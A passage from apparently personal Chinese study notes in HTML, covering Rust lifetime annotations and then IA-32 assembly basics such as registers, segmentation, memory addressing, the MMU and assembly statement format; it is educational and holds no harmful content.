<div class="language-text highlight"><pre><span></span><code><span id="__span-154-1"><a id="__codelineno-154-1" name="__codelineno-154-1" href="#note-cs-rust-rust-__codelineno-154-1"></a>&amp;i32        // 常规引用
</span><span id="__span-154-2"><a id="__codelineno-154-2" name="__codelineno-154-2" href="#note-cs-rust-rust-__codelineno-154-2"></a>&amp;&#39;a i32     // 含有生命周期注释的引用
</span><span id="__span-154-3"><a id="__codelineno-154-3" name="__codelineno-154-3" href="#note-cs-rust-rust-__codelineno-154-3"></a>&amp;&#39;a mut i32 // 可变型含有生命周期注释的引用
</span></code></pre></div>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-155-1"><a id="__codelineno-155-1" name="__codelineno-155-1" href="#note-cs-rust-rust-__codelineno-155-1"></a><span class="k">fn</span> <span class="nf">longer</span><span class="o">&lt;&#39;</span><span class="na">a</span><span class="o">&gt;</span><span class="p">(</span><span class="n">s1</span>: <span class="kp">&amp;</span><span class="o">&#39;</span><span class="na">a</span> <span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span>: <span class="kp">&amp;</span><span class="o">&#39;</span><span class="na">a</span> <span class="kt">str</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kp">&amp;</span><span class="o">&#39;</span><span class="na">a</span> <span class="kt">str</span> <span class="p">{</span>
</span><span id="__span-155-2"><a id="__codelineno-155-2" name="__codelineno-155-2" href="#note-cs-rust-rust-__codelineno-155-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">s2</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">s1</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-155-3"><a id="__codelineno-155-3" name="__codelineno-155-3" href="#note-cs-rust-rust-__codelineno-155-3"></a><span class="w">        </span><span class="n">s2</span>
</span><span id="__span-155-4"><a id="__codelineno-155-4" name="__codelineno-155-4" href="#note-cs-rust-rust-__codelineno-155-4"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-155-5"><a id="__codelineno-155-5" name="__codelineno-155-5" href="#note-cs-rust-rust-__codelineno-155-5"></a><span class="w">        </span><span class="n">s1</span>
</span><span id="__span-155-6"><a id="__codelineno-155-6" name="__codelineno-155-6" href="#note-cs-rust-rust-__codelineno-155-6"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-155-7"><a id="__codelineno-155-7" name="__codelineno-155-7" href="#note-cs-rust-rust-__codelineno-155-7"></a><span class="p">}</span>
</span><span id="__span-155-8"><a id="__codelineno-155-8" name="__codelineno-155-8" href="#note-cs-rust-rust-__codelineno-155-8"></a>
</span><span id="__span-155-9"><a id="__codelineno-155-9" name="__codelineno-155-9" href="#note-cs-rust-rust-__codelineno-155-9"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-155-10"><a id="__codelineno-155-10" name="__codelineno-155-10" href="#note-cs-rust-rust-__codelineno-155-10"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
</span><span id="__span-155-11"><a id="__codelineno-155-11" name="__codelineno-155-11" href="#note-cs-rust-rust-__codelineno-155-11"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-155-12"><a id="__codelineno-155-12" name="__codelineno-155-12" href="#note-cs-rust-rust-__codelineno-155-12"></a><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;rust&quot;</span><span class="p">;</span>
</span><span id="__span-155-13"><a id="__codelineno-155-13" name="__codelineno-155-13" href="#note-cs-rust-rust-__codelineno-155-13"></a><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;ecmascript&quot;</span><span class="p">;</span>
</span><span id="__span-155-14"><a id="__codelineno-155-14" name="__codelineno-155-14" href="#note-cs-rust-rust-__codelineno-155-14"></a><span class="w">        </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">longer</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span><span class="p">);</span>
</span><span id="__span-155-15"><a id="__codelineno-155-15" name="__codelineno-155-15" href="#note-cs-rust-rust-__codelineno-155-15"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{} is longer&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">);</span>
</span><span id="__span-155-16"><a id="__codelineno-155-16" name="__codelineno-155-16" href="#note-cs-rust-rust-__codelineno-155-16"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-155-17"><a id="__codelineno-155-17" name="__codelineno-155-17" href="#note-cs-rust-rust-__codelineno-155-17"></a><span class="p">}</span>
</span></code></pre></div>
<p>我们需要用泛型声明来规范生命周期的名称，随后函数返回值的生命周期将与两个参数的生命周期一致</p>
<h3 id="note-cs-rust-rust-_53">静态生命周期<a class="headerlink" href="#note-cs-rust-rust-_53" title="Permanent link">&para;</a></h3>
<p>生命周期注释有一个特别的：'static 。所有用双引号包括的字符串常量所代表的精确数据类型都是 &amp;'static str ，'static 所表示的生命周期从程序运行开始到程序运行结束。</p></section>
                    <section class='print-page md-section' id='section-2-4-4-3' heading-number='2.4.4.3'>
                        <h1>汇编学习笔记<a class='headerlink' href='#section-2-4-4-3' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-cs-asm-wk1" heading-number="2.4.4.3.1"><h1 id="note-cs-asm-wk1-_1">计算机的硬件组成结构<a class="headerlink" href="#note-cs-asm-wk1-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3052 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 7 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 11 分钟</p>
</div>
<p>计算机有三大硬件组成部分</p>
<ul>
<li>
<p>CPU:包含运算器，控制器，寄存器</p>
</li>
<li>
<p>主存储器</p>
</li>
<li>
<p>I/O接口：辅助存储器，输入设备，输出设备</p>
</li>
</ul>
<p>而汇编程序员将硬件抽象为</p>
<ul>
<li>
<p>寄存器</p>
</li>
<li>
<p>存储器地址</p>
</li>
<li>
<p>输入输出地址 </p>
</li>
</ul>
<h2 id="note-cs-asm-wk1-register">寄存器(Register)<a class="headerlink" href="#note-cs-asm-wk1-register" title="Permanent link">&para;</a></h2>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>寄存器是处理器内部的高速存储单元,用于暂时存放程序执行过程中的代码和数据</p>
<p>大致可以分成两类</p>
<ul>
<li>
<p>透明寄存器：对应用人员不可见，不能编程直接控制</p>
</li>
<li>
<p>可编程（programmable）寄存器：具有引用名称，可以直接供编程使用</p>
</li>
</ul>
</div>
<p>可编程寄存器又分为通用寄存器和专用寄存器</p>
<h3 id="note-cs-asm-wk1-_2">处理器通用寄存器<a class="headerlink" href="#note-cs-asm-wk1-_2" title="Permanent link">&para;</a></h3>
<p>处理器最常使用整数通用寄存器，可以用于保存整数数据，地址等</p>
<p>32位的IA-32处理器具有8个32位通用寄存器</p>
<ul>
<li>EAX，EBX，ECX，EDX，ESI，EDI，EBI，ESP</li>
</ul>
<table>
<thead>
<tr>
<th>Register</th>
<th>English Name</th>
<th>Chinese Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>EAX</td>
<td>Accumulator</td>
<td>累加器</td>
</tr>
<tr>
<td>EBX</td>
<td>Base Address</td>
<td>基址寄存器</td>
</tr>
<tr>
<td>ECX</td>
<td>Counter</td>
<td>计数器</td>
</tr>
<tr>
<td>EDX</td>
<td>Data</td>
<td>数据寄存器</td>
</tr>
<tr>
<td>ESI</td>
<td>Source Index</td>
<td>源变址寄存器</td>
</tr>
<tr>
<td>EDI</td>
<td>Destination Index</td>
<td>目的变址寄存器</td>
</tr>
<tr>
<td>EBP</td>
<td>Base Pointer</td>
<td>基址指针</td>
</tr>
<tr>
<td>ESP</td>
<td>Stack Pointer</td>
<td>堆栈指针</td>
</tr>
</tbody>
</table>
<p>源自16位8086处理器的8个16位通用寄存器（E为扩展，即extend）</p>
<ul>
<li>AX，BX，CX，DX，SI，DI，BP，SP，前四个寄存器可分高低字节，形成8个8位的通用寄存器：AH,AL,BH,BL,CH,CL,DH,DL</li>
</ul>
<p>这使得这些寄存器既是一个整体，又可以独立使用</p>
<details class="note">
<summary>图示</summary>
<p><img alt="alt text" src="../NOTE/CS/ASM/image.png" />
<img alt="alt text" src="../NOTE/CS/ASM/image-1.png" /></p>
</details>
<h3 id="note-cs-asm-wk1-_3">处理器专用寄存器<a class="headerlink" href="#note-cs-asm-wk1-_3" title="Permanent link">&para;</a></h3>
<p>专用寄存器主要有三类，<strong>标志寄存器</strong>，<strong>指令指针寄存器</strong>，<strong>段寄存器</strong></p>
<h4 id="note-cs-asm-wk1-flag">标志（Flag）寄存器<a class="headerlink" href="#note-cs-asm-wk1-flag" title="Permanent link">&para;</a></h4>
<details class="info">
<summary>什么是标志</summary>
<p>标志体现了某种工作状态，有些处理器标志用于反映指令执行结果（加减是否进位借位，数据是否为0，正负），有些处理器标志用于控制指令执行形式（处理器是否单步操作，是否响应外部中断）</p>
</details>
<p>各种标志组合在一个专用寄存器形成标志寄存器，8086支持16位的标志寄存器FLAGS</p>
<p>IA-32处理器形成32位EFLAGS标志寄存器</p>
<ul>
<li>
<p>状态标志：记录指令执行结果的辅助信息，<strong>是处理器最基本的标志</strong></p>
<ul>
<li>加减运算和逻辑运算指令主要设置他们</li>
<li>其他有些指令的执行也会相应地设置他们</li>
<li>处理器主要使用其中5个构成各种条件（分支指令判断这些条件实现程序分支）</li>
</ul>
</li>
<li>
<p>控制标志： 方向标志DF，仅用于串操作指令</p>
</li>
<li>系统标志： 控制操作系统或核心管理程序的操作方式</li>
</ul>
<h4 id="note-cs-asm-wk1-eip">指令指针寄存器EIP<a class="headerlink" href="#note-cs-asm-wk1-eip" title="Permanent link">&para;</a></h4>
<p>用于保存 <strong>将要执行的指令在主存的存储器地址</strong> ，相当于一个指向将要执行指令的指针</p>
<ul>
<li>
<p>在顺序执行时会自动增量，指向下一条指令</p>
</li>
<li>
<p>分支，调用等操作时执行控制转移指令修改，引起程序到指定的指令执行</p>
</li>
<li>
<p>在出现中断或者异常时被处理器赋值而相应改变</p>
</li>
</ul>
<h4 id="note-cs-asm-wk1-_4">段寄存器<a class="headerlink" href="#note-cs-asm-wk1-_4" title="Permanent link">&para;</a></h4>
<div class="admonition note">
<p class="admonition-title">存储空间分段管理</p>
<p>“段”是保存相关代码或者数据的一个主存区域</p>
<p>应用程序主要涉及三类基本段</p>
<ul>
<li>
<p>代码段（Code Segment）
   存放程序的可执行代码（处理器指令）</p>
</li>
<li>
<p>数据段（Data Segment）
   存放全局变量等程序所用的数据</p>
</li>
<li>
<p>堆栈段（Stack Segment）
   这是程序所需要的特殊区域，用于存放返回地址，临时变量等
<img alt="alt text" src="../NOTE/CS/ASM/image-2.png" /></p>
</li>
</ul>
</div>
<p>段寄存器表明某个段在主存中的位置</p>
<p>根据各个段的首字母缩写来给相应的寄存器命名，共有6个16位寄存器</p>
<table>
<thead>
<tr>
<th>代码段</th>
<th>CS</th>
</tr>
</thead>
<tbody>
<tr>
<td>堆栈段</td>
<td>SS</td>
</tr>
<tr>
<td>数据段</td>
<td>DS，ES（Extra segment），FS，DS</td>
</tr>
</tbody>
</table>
<p><strong>代码段的当前指令地址</strong></p>
<ul>
<li>段基地址：由代码段寄存器CS保存</li>
<li>偏移地址：由指令指针寄存器EIP保存</li>
</ul>
<p><strong>堆栈段的当前栈顶地址</strong></p>
<ul>
<li>段基地址：堆栈段寄存器SS保存</li>
<li>堆栈指针寄存器ESP保存   </li>
</ul>
<p><strong>数据段的操作数地址</strong></p>
<ul>
<li>段基地址：数据段寄存器DS指示，有时候也用ES，FS，GS指示</li>
<li>偏移地址：没有专门的寄存器，由存储器寻址方式计算出的有效地址EA指示</li>
</ul>
<p>编程采用的逻辑地址为  段基地址:偏移地址 的组合</p>
<ul>
<li>段基地址：在主存中的起始地址</li>
<li>偏移地址：距离段基地址的便宜量</li>
</ul>
<details class="info">
<summary>Info</summary>
<p><img alt="alt text" src="../NOTE/CS/ASM/image-4.png" />
<img alt="alt text" src="../NOTE/CS/ASM/image-5.png" />
<img alt="alt text" src="../NOTE/CS/ASM/image-6.png" /></p>
</details>
<div class="admonition note">
<p class="admonition-title">总结</p>
<p>寄存器分为不可编程的 <strong>透明寄存器</strong> 和 <strong>可编程寄存器</strong> ，可编程寄存器又可以进行分类</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>类型</th>
<th>寄存器</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>通用寄存器</strong></td>
<td>32位通用寄存器</td>
<td>EAX EBX ECX EDX ESI EDI EBP ESP</td>
</tr>
<tr>
<td></td>
<td>16位通用寄存器</td>
<td>AX  BX  CX  DX  SI  DI  BP  SP</td>
</tr>
<tr>
<td></td>
<td>8位通用寄存器</td>
<td>AH  AL  BH  BL  CH  CL  DH  DL</td>
</tr>
<tr>
<td><strong>专用寄存器</strong></td>
<td>标志寄存器</td>
<td>EFLAGS</td>
</tr>
<tr>
<td></td>
<td>指令指针寄存器</td>
<td>EIP</td>
</tr>
<tr>
<td></td>
<td>段寄存器</td>
<td>CS  DS  SS  ES  FS  GS</td>
</tr>
</tbody>
</table>
</div>
<h2 id="note-cs-asm-wk1-_5">存储器组织<a class="headerlink" href="#note-cs-asm-wk1-_5" title="Permanent link">&para;</a></h2>
<p>计算机硬件组成结构中的主存储器容量很大，被划分为许多存储单元，每个存储单元被编排一个号码，即存储单元地址，称为 <strong>存储器地址（Memory Address）</strong></p>
<p>每个存储单元以字节为基本存储单位</p>
<ul>
<li>即字节编址（Byte Addressable）</li>
<li>一个字节（Byte）等于8个二进制位（Bit）,两个字节称为字，两个字称为双字</li>
<li>IA-32有32位地址，可以访问 4GB 内存</li>
</ul>
<h3 id="note-cs-asm-wk1-_6">存储器的物理地址<a class="headerlink" href="#note-cs-asm-wk1-_6" title="Permanent link">&para;</a></h3>
<p>处理器连接的物理存储器使用物理地址</p>
<ul>
<li>从0开始顺序编排，直到其支持的最大存储单元</li>
</ul>
<p><img alt="alt text" src="../NOTE/CS/ASM/image-7.png" /></p>
<h4 id="note-cs-asm-wk1-_7">存储管理单元和存储模型<a class="headerlink" href="#note-cs-asm-wk1-_7" title="Permanent link">&para;</a></h4>
<p>高性能处理器集成有存储管理单元MMU，利用它进行主存储器空间管理</p>
<p><strong>存储管理单元</strong>（Memory Management Unit, MMU）是计算机系统中的一个硬件组件，负责管理计算机的内存使用情况。它在CPU与物理内存（RAM）之间起到桥梁作用，主要职责有：</p>
<ul>
<li>
<p><strong>地址转换（虚拟内存到物理内存映射）</strong>
程序并不直接寻址物理存储器 
MMU将程序使用的虚拟地址（逻辑地址）转换为物理地址。这种地址转换通常是通过分页（paging）或分段（segmentation）机制来实现的。每个进程在自己的虚拟地址空间中运行，这样可以使多个进程共存于系统内存中而互不干扰。</p>
</li>
<li>
<p><strong>内存保护</strong>
MMU可以设置不同的权限（如读、写、执行）来保护内存区域，防止一个进程访问另一个进程的内存或操作系统内存，保障系统的安全性和稳定性。</p>
</li>
<li>
<p><strong>内存分配与回收</strong>
MMU协助操作系统在程序运行时分配和释放内存。它帮助管理物理内存的分配，以确保内存高效利用并减少碎片化。</p>
</li>
<li>
<p><strong>分页管理</strong>
MMU通过分页机制，将程序的虚拟内存划分为固定大小的块（称为页面），并将这些页面映射到物理内存的实际位置。这样可以有效地管理内存，并支持虚拟内存技术，使程序能够使用超过物理内存大小的内存空间。</p>
</li>
<li>
<p><strong>缓存管理</strong>
在一些高级系统中，MMU也参与管理CPU缓存（如L1、L2缓存）与内存之间的数据交换。它确定哪些数据应该留在缓存中以提高访问速度。</p>
</li>
<li>
<p><strong>异常处理</strong>
当程序试图访问无效的地址（如没有映射到物理内存的虚拟地址）时，MMU会产生一个异常（通常称为页面错误或缺页中断），通知操作系统处理这个情况，如分配新的内存页或从磁盘加载需要的数据。</p>
</li>
</ul>
<p><strong>IA-32</strong> 处理器的存储模型</p>
<ul>
<li>平展存储模型（Flat Memory Model）：存储器是一个连续的4GB线性地址空间</li>
<li>段式存储模型（Segmented Memory Model）<ul>
<li>存储器由一组独立的地址空间组成：段（Segment）</li>
<li>每个段都可以达到4GB</li>
</ul>
</li>
<li>实地址存储模型（Real-address Memory Model）<ul>
<li>8086处理器的存储模型（最大1MB）</li>
<li>段式存储模型的特例（段最大64KB）</li>
</ul>
</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>存储器空间可以分段管理，采用逻辑地址指示</p>
<p>举个例子，有一幢楼，3层，每一层有10个房间，首先我们从第一层01开始编号到最后一个房间30</p>
<p>对于第二层第五个房间，物理地址是绝对地址:15，但是为了方便，它被称为205，这就是它的逻辑地址（相对地址）</p>
</div>
<div class="admonition note">
<p class="admonition-title">三大地址的关系</p>
<p>程序员编程时采用逻辑地址，操作系统利用存储管理单元MMU将逻辑地址映射成线性地址（虚拟地址），处理器使用物理地址访问主存储器芯片</p>
<p><strong>逻辑地址（Logical Address）</strong></p>
<ul>
<li><strong>定义</strong>: 逻辑地址是程序员在编写程序时使用的地址，由CPU在执行程序时生成。</li>
<li><strong>特点</strong>: 逻辑地址是相对于程序的起始地址的偏移量，与实际的物理内存位置无关。</li>
<li><strong>别名</strong>: 逻辑地址也被称为 <strong>虚拟地址（Virtual Address）</strong> 。在每个进程的上下文中，逻辑地址是唯一的。</li>
<li><strong>使用</strong>: 逻辑地址是在程序代码中使用的，比如指针或数组索引。它们是由编译器生成的，并且不会直接对应到物理内存的具体位置。</li>
</ul>
<p><strong>线性地址（Linear Address）</strong></p>
<ul>
<li><strong>定义</strong>: 线性地址是将逻辑地址转换成物理地址之前的一个中间地址。它是经过分段（segmentation）计算后的地址。</li>
<li><strong>特点</strong>: 线性地址是通过把逻辑地址和段寄存器（如CS、DS等）中的段基址相加得到的。  </li>
<li><strong>使用</strong>: 在有些体系结构中，线性地址可能直接等于物理地址（如无分页机制的情况下），但是在大多数现代处理器中，线性地址通过分页机制进一步转换为物理地址。</li>
</ul>
<p><strong>物理地址（Physical Address）</strong></p>
<ul>
<li><strong>定义</strong>: 物理地址是内存单元在计算机实际物理内存（RAM）中的位置。它是CPU最终使用的实际地址。</li>
<li><strong>特点</strong>: 物理地址由线性地址经过分页（paging）机制转换而来，是指向实际内存芯片的地址。</li>
<li>
<p><strong>使用</strong>: 物理地址是由内存控制器使用的，用于访问实际的物理内存位置。</p>
</li>
<li>
<p><strong>逻辑地址到线性地址的转换（分段）</strong>:</p>
</li>
<li>
<p>逻辑地址由程序生成，分为段选择器和段内偏移量。段选择器指向内存段描述符（存储在段寄存器中），而偏移量指向段内的具体位置。</p>
</li>
<li>MMU使用段选择器查找段基址，然后将段基址与偏移量相加，生成线性地址。</li>
<li><strong>公式</strong>:  </li>
</ul>
<p>$$
   \text{线性地址} = \text{段基址} + \text{逻辑地址中的偏移量}
   $$</p>
<ol>
<li>
<p><strong>线性地址到物理地址的转换（分页）</strong>:</p>
</li>
<li>
<p>线性地址进一步通过分页机制转换为物理地址。分页机制将线性地址划分为多个固定大小的页面，线性地址中的页号部分用于查找页表（Page Table），得到物理页帧号。</p>
</li>
<li>线性地址的页内偏移量部分与物理页帧号组合形成物理地址。</li>
<li><strong>公式</strong>:</li>
</ol>
<p>$$
   \text{物理地址} = \text{物理页帧号} + \text{页内偏移量}$$</p>
<ul>
<li><strong>逻辑地址</strong> 是程序员或编译器使用的地址，描述的是虚拟内存中的位置。</li>
<li><strong>线性地址</strong> 是经过分段机制转换后的地址，是逻辑地址与段基址之和。</li>
<li><strong>物理地址</strong> 是存储器中实际访问的位置，由线性地址经过分页机制转换得到。</li>
</ul>
</div></section><section class="print-page" id="note-cs-asm-wk1_2" heading-number="2.4.4.3.2"><h1 id="note-cs-asm-wk1_2-_1">汇编程序格式<a class="headerlink" href="#note-cs-asm-wk1_2-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3089 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 83 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 2 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 12 分钟</p>
</div>
<h2 id="note-cs-asm-wk1_2-_2">处理器指令格式<a class="headerlink" href="#note-cs-asm-wk1_2-_2" title="Permanent link">&para;</a></h2>
<p>程序由程序设计语言编写，由 <strong>指令</strong> 构成，<strong>指令</strong> 由 <strong>操作码</strong> 和 <strong>操作数（地址码）</strong> 构成，<strong>操作码（Opcode）</strong> 表明处理器执行的操作， <strong>操作数（Oprand）</strong> 是参与操作的数据对象</p>
<div class="admonition note">
<p class="admonition-title">最基本的数据传送指令--MOV(move)</p>
<p>传送指令的助记符：<code>MOV</code></p>
<p>类似于高级语言的赋值语句，将数据从一个位置 <strong>传送</strong> 到另一个位置</p>
<p>例如</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-asm-wk1_2-__codelineno-0-1"></a><span class="nf">mov</span><span class="w"> </span><span class="nv">dest</span><span class="p">,</span><span class="nv">src</span><span class="w">  </span><span class="c1">;操作码为mov，操作数为dest src</span>
</span></code></pre></div>
<p><code>src</code>为源操作数，是被传送的数据或者数据所在的位置</p>
<p><code>dest</code>为目的操作数，是数据将要传送到的位置</p>
</div>
<p>IA-32 处理器采用可变长度指令格式</p>
<ul>
<li>
<p>操作码</p>
<ul>
<li>可选的指令前缀（用于扩展指令功能，一般0至4字节</li>
<li>1至3字节的主要操作码</li>
</ul>
</li>
<li>
<p>操作数</p>
<ul>
<li>可选的寻址方式域</li>
<li>可选的位移量</li>
<li>可选的立即数</li>
</ul>
</li>
</ul>
<details class="example">
<summary>Example</summary>
<p><img alt="alt text" src="../NOTE/CS/ASM/image-9.png" /></p>
<p><img alt="alt text" src="../NOTE/CS/ASM/image-8.png" /></p>
</details>
<h2 id="note-cs-asm-wk1_2-_3">汇编语言语句格式<a class="headerlink" href="#note-cs-asm-wk1_2-_3" title="Permanent link">&para;</a></h2>
<p>源程序由语句组成，通常一个语句占一行，一个语句不超过132个字符，4个部分</p>
<div class="admonition info">
<p class="admonition-title">语句的种类</p>
<p><strong>执行性语句</strong> ：表达处理器指令，实现功能，格式为</p>
<p><code>标号: 硬指令助记符 操作数,操作数 ;注释</code></p>
<p><strong>说明性语句</strong> : 表达伪指令，控制汇编方式 格式为</p>
<p><code>名字 伪指令助记符 参数,参数,... ;注释</code></p>
</div>
<p>在汇编语言中，<strong>标号</strong>（Label）和 <strong>名字</strong>（Name）都是用于标识特定内存位置、代码段或数据的符号。</p>
<h3 id="note-cs-asm-wk1_2-1-label">1. 标号（Label）<a class="headerlink" href="#note-cs-asm-wk1_2-1-label" title="Permanent link">&para;</a></h3>
<p><strong>标号</strong> 通常用于标记代码中的特定位置，通常是处理器指令的逻辑地址。指示分支，循环等程序的目的地址。标号在汇编程序中有两个主要用途：</p>
<ul>
<li>
<p><strong>跳转目标</strong> ：标号常用于控制程序的流，例如条件跳转（<code>JMP</code>、<code>JE</code>、<code>JNE</code>等）或循环结构中，标号表示目标地址，指明程序应跳转到的特定位置。</p>
</li>
<li>
<p><strong>函数或过程的入口</strong> ：标号也常用于标记一个函数或过程的起始地址，以便程序能够正确调用。</p>
</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><strong>语法</strong> ：</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-asm-wk1_2-__codelineno-1-1"></a><span class="nl">label_name:</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-asm-wk1_2-__codelineno-1-2"></a><span class="w">    </span><span class="c1">; 一些指令</span>
</span></code></pre></div>
<p>例如：</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-asm-wk1_2-__codelineno-2-1"></a><span class="nl">start:</span><span class="w">              </span><span class="c1">; 这是一个标号</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-cs-asm-wk1_2-__codelineno-2-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-cs-asm-wk1_2-__codelineno-2-3"></a><span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="nv">start</span><span class="w">       </span><span class="c1">; 跳转到标号 &#39;start&#39;</span>
</span></code></pre></div>
</div>
<h3 id="note-cs-asm-wk1_2-2-name">2. 名字（Name）<a class="headerlink" href="#note-cs-asm-wk1_2-2-name" title="Permanent link">&para;</a></h3>
<p><strong>名字</strong> 通常用于数据段中，表示变量、常量或其他数据元素的名称。名字便于程序员在编写代码时识别和引用这些数据。</p>
<ul>
<li><strong>数据定义</strong> ：名字用于在数据段中定义和标识数据项。</li>
<li><strong>指针或偏移量</strong> ：名字可用来表示特定数据项在内存中的位置或偏移量，以便在程序中引用。</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><strong>语法</strong>：</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-asm-wk1_2-__codelineno-3-1"></a><span class="nf">name</span><span class="w"> </span><span class="nv">db</span><span class="w"> </span><span class="mh">0x10</span><span class="w">       </span><span class="c1">; 定义一个字节大小的变量 &#39;name&#39; 并初始化为 0x10</span>
</span></code></pre></div>
<p>例如：
